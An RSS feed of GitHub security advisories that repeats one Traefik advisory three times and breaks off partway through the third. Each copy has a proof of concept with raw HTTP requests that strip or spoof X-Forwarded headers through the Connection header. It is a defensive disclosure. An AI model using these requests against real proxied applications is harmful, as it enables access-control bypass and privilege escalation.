<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-09-19T15:01:26.271Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik] HTTP client can manipulate custom HTTP headers that are added by Traefik]]></title>
        <id>https://github.com/advisories/GHSA-62c8-mh53-4cqv</id>
        <link href="https://github.com/advisories/GHSA-62c8-mh53-4cqv"/>
        <updated>2024-09-19T14:48:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a vulnerability in Traefik that allows the client to remove the X-Forwarded headers (except the header X-Forwarded-For).</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.9">https://github.com/traefik/traefik/releases/tag/v2.11.9</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.3">https://github.com/traefik/traefik/releases/tag/v3.1.3</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary

<p>When a HTTP request is processed by Traefik, certain HTTP headers such as X-Forwarded-Host or X-Forwarded-Port are added by Traefik before the request is routed to the application. For a HTTP client, it should not be possible to remove or modify these headers. Since the application trusts the value of these headers, security implications might arise, if they can be modified.</p>
<p>For HTTP/1.1, however, it was found that some of theses custom headers can indeed be removed and in certain cases manipulated. The attack relies on the HTTP/1.1 behavior, that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:</p>
<p>Connection: close, X-Forwarded-Host</p>
<p>Depending on how the receiving application handles such cases, security implications may arise. Moreover, some application frameworks (e.g. Django) first transform the "-" to "_" signs, making it possible for the HTTP client to even modify these headers in these cases.</p>
<p>This is similar to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> for Apache HTTP Server.</p>
<h3 id="details">Details</h3>
<p>It was found that the following headers can be removed in this way (i.e. by specifing them within a connection header):</p>
<ul>
<li>X-Forwarded-Host</li>
<li>X-Forwarded-Port</li>
<li>X-Forwarded-Proto</li>
<li>X-Forwarded-Server</li>
<li>X-Real-Ip</li>
<li>X-Forwarded-Tls-Client-Cert</li>
<li>X-Forwarded-Tls-Client-Cert-Info</li>
</ul>
<h3 id="poc">PoC</h3>
<p>The following docker-compose file has been used for a simple setup:</p>
<pre><code>services:
  traefik:
    image: traefik:v3.1
    container_name: traefik
    ports:
      - "443:443"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./traefik.yaml:/etc/traefik/traefik.yaml
      - ./traefik-certs:/certs

  python-http:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: python-http
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.python-http.rule=Host(`python.example.com`)"
      - "traefik.http.routers.python-http.entrypoints=websecure"
      - "traefik.http.routers.python-http.tls=true"
      - "traefik.http.services.python-http.loadbalancer.server.port=8080"
</code></pre>
<p>The following traefik.yaml has been used:</p>
<pre><code>providers:
  docker:
    exposedByDefault: false
    watch: true
  file:
    fileName: /etc/traefik/traefik.yaml
    watch: true

entryPoints:
  websecure:
    address: ":443"

tls:
  certificates:
    - certFile: /certs/server-cert.pem
      keyFile: /certs/server-key.pem
</code></pre>
<p>The Python container just includes a simple Python HTTP server that prints the HTTP headers it receives. Here is the Dockerfile for the container:</p>
<pre><code>FROM python:3-alpine

# Copy the Python script to the container
COPY server.py /server.py

# Set the working directory
WORKDIR /

# Command to run the Python server
CMD ["python", "/server.py"]
</code></pre>
<p>And here is the Python script:</p>
<pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def _send_response(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(str(self.headers).encode("utf-8"))

    def do_GET(self):
        self._send_response()

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print("Server started on port 8080")
    server.serve_forever()
</code></pre>
<p>The environment is run with <code>sudo docker-compose up</code>.</p>
<p>A normal HTTP request/response pair looks like this:</p>
<p><strong>Request 1</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
</code></pre>
<p><strong>Response 1</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:53:49 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 556

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Host: python.example.com
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
</code></pre>
<p>The custom headers added by Traefik can be seen in the response.</p>
<p>Next, a request, where the X-Forwarded-Host header is defined as a hop-by-hop header via the Connection header is sent:</p>
<p><strong>Request 2</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close, X-Forwarded-Host
</code></pre>
<p><strong>Response 2</strong></p>
<pre><code>Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
</code></pre>
<p>As can be seen from the response, the X-Forwarded-Host header that had been added by Traefik has been removed from the request.</p>
<p>Moreover, the next request/response pair demonstrates that a custom header with underscore instead of hyphen can be added:</p>
<p><strong>Request 3</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X_Forwarded_Host: myhost
Connection: close, X-Forwarded-Host
</code></pre>
<p><strong>Response 3</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:54:48 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 544

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
X_forwarded_host: myhost
</code></pre>
<p>Some backend frameworks (e.g. Django) handle X-Forwarded-Host and X_forwarded_host in the same way. As there is no X-Forwarded-Host header present in the request, the X_forwarded_host header will be used. </p>
<p>It should be noted that when X-Forwarded-Host is present and a X_forwarded_host header is sent, usually the first occurence of the header will be used, which is in this case X-Forwarded-Host.</p>
<p>It should be noted that the headers X-Forwarded-Tls-Client-Cert and X-Forwarded-Tls-Client-Cert-Info are also affected. Here, client certificate authentication would need to be enabled in the Traefik setup.</p>
<h3 id="impact-1">Impact</h3>
<p>All applications that trust the custom headers set by Traefik are affected by this vulnerability. As an example, assume that a backend application trusts Traefik to validate client certificates and trusts therefore the values that are sent within the X-Forwarded-Tls-Client-Cert header, but does not validate the certificate anew.</p>
<p>If the header is removed via the vulnerability, and the application framework allows for alternative names (e.g. by transforming the headers to lower case, and "-" to "_"), an attacker can place his own X_Forwarded_TLS_Client_Cert header in the request. This could lead to privilege escalation, as the attacker may put an (invalid) certificate in this header that would just be accepted by the application, but may contain other data than the certificate that is presented to Traefik for Client Certificate Authentication.</p>
<p>Moreover, if the backend application uses any of the other custom headers for security-sensitive operations, the removal or modification of these headers may also security implications (e.g. access control bypass).</p>
<p>The severity is the same as for <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> for Apache HTTP Server, i.e. 9.8 Critical.</p>
</details>
### References

<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv">https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv</a></li>
<li><a href="https://github.com/traefik/traefik/commit/584144100524277829f26219baaab29a53b8134f">https://github.com/traefik/traefik/commit/584144100524277829f26219baaab29a53b8134f</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.9">https://github.com/traefik/traefik/releases/tag/v2.11.9</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.3">https://github.com/traefik/traefik/releases/tag/v3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-62c8-mh53-4cqv">https://github.com/advisories/GHSA-62c8-mh53-4cqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62c8-mh53-4cqv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-19T14:48:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik/v2] HTTP client can manipulate custom HTTP headers that are added by Traefik]]></title>
        <id>https://github.com/advisories/GHSA-62c8-mh53-4cqv</id>
        <link href="https://github.com/advisories/GHSA-62c8-mh53-4cqv"/>
        <updated>2024-09-19T14:48:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a vulnerability in Traefik that allows the client to remove the X-Forwarded headers (except the header X-Forwarded-For).</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.9">https://github.com/traefik/traefik/releases/tag/v2.11.9</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.3">https://github.com/traefik/traefik/releases/tag/v3.1.3</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary

<p>When a HTTP request is processed by Traefik, certain HTTP headers such as X-Forwarded-Host or X-Forwarded-Port are added by Traefik before the request is routed to the application. For a HTTP client, it should not be possible to remove or modify these headers. Since the application trusts the value of these headers, security implications might arise, if they can be modified.</p>
<p>For HTTP/1.1, however, it was found that some of theses custom headers can indeed be removed and in certain cases manipulated. The attack relies on the HTTP/1.1 behavior, that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:</p>
<p>Connection: close, X-Forwarded-Host</p>
<p>Depending on how the receiving application handles such cases, security implications may arise. Moreover, some application frameworks (e.g. Django) first transform the "-" to "_" signs, making it possible for the HTTP client to even modify these headers in these cases.</p>
<p>This is similar to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> for Apache HTTP Server.</p>
<h3 id="details">Details</h3>
<p>It was found that the following headers can be removed in this way (i.e. by specifing them within a connection header):</p>
<ul>
<li>X-Forwarded-Host</li>
<li>X-Forwarded-Port</li>
<li>X-Forwarded-Proto</li>
<li>X-Forwarded-Server</li>
<li>X-Real-Ip</li>
<li>X-Forwarded-Tls-Client-Cert</li>
<li>X-Forwarded-Tls-Client-Cert-Info</li>
</ul>
<h3 id="poc">PoC</h3>
<p>The following docker-compose file has been used for a simple setup:</p>
<pre><code>services:
  traefik:
    image: traefik:v3.1
    container_name: traefik
    ports:
      - "443:443"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./traefik.yaml:/etc/traefik/traefik.yaml
      - ./traefik-certs:/certs

  python-http:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: python-http
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.python-http.rule=Host(`python.example.com`)"
      - "traefik.http.routers.python-http.entrypoints=websecure"
      - "traefik.http.routers.python-http.tls=true"
      - "traefik.http.services.python-http.loadbalancer.server.port=8080"
</code></pre>
<p>The following traefik.yaml has been used:</p>
<pre><code>providers:
  docker:
    exposedByDefault: false
    watch: true
  file:
    fileName: /etc/traefik/traefik.yaml
    watch: true

entryPoints:
  websecure:
    address: ":443"

tls:
  certificates:
    - certFile: /certs/server-cert.pem
      keyFile: /certs/server-key.pem
</code></pre>
<p>The Python container just includes a simple Python HTTP server that prints the HTTP headers it receives. Here is the Dockerfile for the container:</p>
<pre><code>FROM python:3-alpine

# Copy the Python script to the container
COPY server.py /server.py

# Set the working directory
WORKDIR /

# Command to run the Python server
CMD ["python", "/server.py"]
</code></pre>
<p>And here is the Python script:</p>
<pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def _send_response(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(str(self.headers).encode("utf-8"))

    def do_GET(self):
        self._send_response()

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print("Server started on port 8080")
    server.serve_forever()
</code></pre>
<p>The environment is run with <code>sudo docker-compose up</code>.</p>
<p>A normal HTTP request/response pair looks like this:</p>
<p><strong>Request 1</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
</code></pre>
<p><strong>Response 1</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:53:49 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 556

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Host: python.example.com
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
</code></pre>
<p>The custom headers added by Traefik can be seen in the response.</p>
<p>Next, a request, where the X-Forwarded-Host header is defined as a hop-by-hop header via the Connection header is sent:</p>
<p><strong>Request 2</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close, X-Forwarded-Host
</code></pre>
<p><strong>Response 2</strong></p>
<pre><code>Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
</code></pre>
<p>As can be seen from the response, the X-Forwarded-Host header that had been added by Traefik has been removed from the request.</p>
<p>Moreover, the next request/response pair demonstrates that a custom header with underscore instead of hyphen can be added:</p>
<p><strong>Request 3</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X_Forwarded_Host: myhost
Connection: close, X-Forwarded-Host
</code></pre>
<p><strong>Response 3</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:54:48 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 544

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
X_forwarded_host: myhost
</code></pre>
<p>Some backend frameworks (e.g. Django) handle X-Forwarded-Host and X_forwarded_host in the same way. As there is no X-Forwarded-Host header present in the request, the X_forwarded_host header will be used. </p>
<p>It should be noted that when X-Forwarded-Host is present and a X_forwarded_host header is sent, usually the first occurence of the header will be used, which is in this case X-Forwarded-Host.</p>
<p>It should be noted that the headers X-Forwarded-Tls-Client-Cert and X-Forwarded-Tls-Client-Cert-Info are also affected. Here, client certificate authentication would need to be enabled in the Traefik setup.</p>
<h3 id="impact-1">Impact</h3>
<p>All applications that trust the custom headers set by Traefik are affected by this vulnerability. As an example, assume that a backend application trusts Traefik to validate client certificates and trusts therefore the values that are sent within the X-Forwarded-Tls-Client-Cert header, but does not validate the certificate anew.</p>
<p>If the header is removed via the vulnerability, and the application framework allows for alternative names (e.g. by transforming the headers to lower case, and "-" to "_"), an attacker can place his own X_Forwarded_TLS_Client_Cert header in the request. This could lead to privilege escalation, as the attacker may put an (invalid) certificate in this header that would just be accepted by the application, but may contain other data than the certificate that is presented to Traefik for Client Certificate Authentication.</p>
<p>Moreover, if the backend application uses any of the other custom headers for security-sensitive operations, the removal or modification of these headers may also security implications (e.g. access control bypass).</p>
<p>The severity is the same as for <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> for Apache HTTP Server, i.e. 9.8 Critical.</p>
</details>
### References

<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv">https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv</a></li>
<li><a href="https://github.com/traefik/traefik/commit/584144100524277829f26219baaab29a53b8134f">https://github.com/traefik/traefik/commit/584144100524277829f26219baaab29a53b8134f</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.9">https://github.com/traefik/traefik/releases/tag/v2.11.9</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.3">https://github.com/traefik/traefik/releases/tag/v3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-62c8-mh53-4cqv">https://github.com/advisories/GHSA-62c8-mh53-4cqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62c8-mh53-4cqv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-19T14:48:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik/v3] HTTP client can manipulate custom HTTP headers that are added by Traefik]]></title>
        <id>https://github.com/advisories/GHSA-62c8-mh53-4cqv</id>
        <link href="https://github.com/advisories/GHSA-62c8-mh53-4cqv"/>
        <updated>2024-09-19T14:48:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a vulnerability in Traefik that allows the client to remove the X-Forwarded headers (except the header X-Forwarded-For).</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.9">https://github.com/traefik/traefik/releases/tag/v2.11.9</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.3">https://github.com/traefik/traefik/releases/tag/v3.1.3</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary

<p>When a HTTP request is processed by Traefik, certain HTTP headers such as X-Forwarded-Host or X-Forwarded-Port are added by Traefik before the request is routed to the application. For a HTTP client, it should not be possible to remove or modify these headers. Since the application trusts the value of these headers, security implications might arise, if they can be modified.</p>
<p>For HTTP/1.1, however, it was found that some of theses custom headers can indeed be removed and in certain cases manipulated. The attack relies on the HTTP/1.1 behavior, that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:</p>
<p>Connection: close, X-Forwarded-Host</p>
<p>Depending on how the receiving application handles such cases, security implications may arise. Moreover, some application frameworks (e.g. Django) first transform the "-" to "_" signs, making it possible for the HTTP client to even modify these headers in these cases.</p>
<p>This is similar to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> for Apache HTTP Server.</p>
<h3 id="details">Details</h3>
<p>It was found that the following headers can be removed in this way (i.e. by specifing them within a connection header):</p>
<ul>
<li>X-Forwarded-Host</li>
<li>X-Forwarded-Port</li>
<li>X-Forwarded-Proto</li>
<li>X-Forwarded-Server</li>
<li>X-Real-Ip</li>
<li>X-Forwarded-Tls-Client-Cert</li>
<li>X-Forwarded-Tls-Client-Cert-Info</li>
</ul>
<h3 id="poc">PoC</h3>
<p>The following docker-compose file has been used for a simple setup:</p>
<pre><code>services:
  traefik:
    image: traefik:v3.1
    container_name: traefik
    ports:
      - "443:443"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./traefik.yaml:/etc/traefik/traefik.yaml
      - ./traefik-certs:/certs

  python-http:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: python-http
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.python-http.rule=Host(`python.example.com`)"
      - "traefik.http.routers.python-http.entrypoints=websecure"
      - "traefik.http.routers.python-http.tls=true"
      - "traefik.http.services.python-http.loadbalancer.server.port=8080"
</code></pre>
<p>The following traefik.yaml has been used:</p>
<pre><code>providers:
  docker:
    exposedByDefault: false
    watch: true
  file:
    fileName: /etc/traefik/traefik.yaml
    watch: true

entryPoints:
  websecure:
    address: ":443"

tls:
  certificates:
    - certFile: /certs/server-cert.pem
      keyFile: /certs/server-key.pem
</code></pre>
<p>The Python container just includes a simple Python HTTP server that prints the HTTP headers it receives. Here is the Dockerfile for the container:</p>
<pre><code>FROM python:3-alpine

# Copy the Python script to the container
COPY server.py /server.py

# Set the working directory
WORKDIR /

# Command to run the Python server
CMD ["python", "/server.py"]
</code></pre>
<p>And here is the Python script:</p>
<pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def _send_response(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(str(self.headers).encode("utf-8"))

    def do_GET(self):
        self._send_response()

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print("Server started on port 8080")
    server.serve_forever()
</code></pre>
<p>The environment is run with <code>sudo docker-compose up</code>.</p>
<p>A normal HTTP request/response pair looks like this:</p>
<p><strong>Request 1</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
</code></pre>
<p><strong>Response 1</strong></p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Date: Tue, 03 Sep 2024 06:53:49 GMT
Server: BaseHTTP/0.6 Python/3.12.5
Connection: close
Content-Length: 556

Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Host: python.example.com
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
</code></pre>
<p>The custom headers added by Traefik can be seen in the response.</p>
<p>Next, a request, where the X-Forwarded-Host header is defined as a hop-by-hop header via the Connection header is sent:</p>
<p><strong>Request 2</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close, X-Forwarded-Host
</code></pre>
<p><strong>Response 2</strong></p>
<pre><code>Host: python.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
X-Forwarded-For: 172.20.0.1
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: 3138fe4f0a2e
X-Real-Ip: 172.20.0.1
</code></pre>
<p>As can be seen from the response, the X-Forwarded-Host header that had been added by Traefik has been removed from the request.</p>
<p>Moreover, the next request/response pair demonstrates that a custom header with underscore instead of hyphen can be added:</p>
<p><strong>Request 3</strong></p>
<pre><code>GET / HTTP/1.1
Host: python.example.com
